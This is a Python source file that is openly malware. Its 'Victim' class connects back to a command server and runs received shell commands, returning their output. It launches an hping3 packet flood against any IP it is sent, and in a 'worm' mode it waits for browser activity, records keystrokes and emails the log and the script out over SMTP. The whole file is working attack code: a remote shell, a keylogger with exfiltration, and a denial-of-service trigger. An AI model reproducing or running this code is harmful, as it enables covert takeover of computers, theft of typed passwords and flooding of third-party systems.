import smtplib
import os
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import keyboard
import requests
import socket
import time
import psutil
import subprocess
import ast

class EmailSender:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
        # Create a multipart message
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = ", ".join(recipients)
        msg['Subject'] = subject

        # Add message body
        msg.attach(MIMEText(message, 'plain'))

        # Add attachment
        attachment_filename = os.path.basename(attachment_path)
        with open(attachment_path, "rb") as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {attachment_filename}")
            msg.attach(part)

        # Send the email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.login(self.username, self.password)
                server.send_message(msg)
            print("Email sent successfully!")
        except smtplib.SMTPException as e:
            print("Failed to send email. Error:", str(e))

class Victim:
    def __init__(self, server_ip, server_port, email_address, password):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client = None
        self.email_address = email_address
        self.password = password

    def connect_to_server(self):
        print("####################################")
        print("########## Client Program ##########")
        print("####################################")

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client Initiated...")
        self.client.connect((self.server_ip, self.server_port))
        print("Msg: Connection initiated...")

    def online_interaction(self):
        while True:
            print("[+] Awaiting Shell Commands...")
            user_command = self.client.recv(1024).decode()

            if user_command.strip() == "exit":
                break

            if user_command.startswith("Attack"):
                command_parts = user_command.split()
                if len(command_parts) == 2:
                    ip_address = command_parts[1]
                    self.send_packets(ip_address)
            else:
                op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()

                print("[+] Sending Command Output...")
                if output == b"" and output_error == b"":
                    self.client.send(b"client_msg: no visible output")
                else:
                    self.client.send(output + output_error)

    def send_email_with_keystrokes(self, keystrokes):
        if not self.email_address or not self.password:
            print("Please set the email address and password before sending the email.")
            return

        # Email configuration
        smtp_server = 'smtp.example.com'
        smtp_port = 587

        email_sender = EmailSender(smtp_server, smtp_port, self.email_address, self.password)

        subject = 'Keystroke Log'
        message = f'Keystrokes captured: {keystrokes}'
        attachment_path = __file__  # Attach the current script file
        recipients = [self.email_address]

        email_sender.send_email_with_attachment(subject, message, attachment_path, recipients)

    def start_recording(self):
        recorded_keystrokes = []

        def record_keystroke(event):
            if event.event_type == "down":
                if event.name == "space":
                    recorded_keystrokes.append(" ")
                else:
                    recorded_keystrokes.append(event.name)

        keyboard.hook(record_keystroke)

        print("Recording keystrokes. Press Enter to stop...")
        input()

        keyboard.unhook(record_keystroke)

        keystrokes = " ".join(recorded_keystrokes)
        self.send_email_with_keystrokes(keystrokes)

    def start_worm_actions(self):
        print("Waiting for network connection...")
        while True:
            try:
                # Try to establish a connection to a known host
                socket.create_connection(("www.example.com", 80))
                break
            except OSError:
                # Network connection failed, wait for a while before retrying
                time.sleep(10)
        print("Network connected.")

        print("Waiting for web browser activity...")
        while not self.is_browser_active():
            time.sleep(2)
        print("Web browser detected. Starting keystroke recording.")

        self.start_recording()

    def is_browser_active(self):
        for process in psutil.process_iter(['name']):
            if process.info['name'].lower() in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
                return True
        return False

    def send_packets(self, ip_address):
        hping_command = f"hping3 {ip_address} -d 65535 -c 0"
        process = subprocess.Popen(hping_command, shell=True)

        while True:
            if keyboard.is_pressed('esc'):
                process.terminate()
                break

if __name__ == '__main__':
    choice = "online"  # "offline"
    server_ip = '127.0.0.1'
    server_port = 4000
    email_address = ""
    password = ""

    victim = Victim(server_ip, server_port, email_address, password)
    victim.connect_to_server()

    if choice == "online":
        victim.online_interaction()
    else:
        victim.start_worm_actions()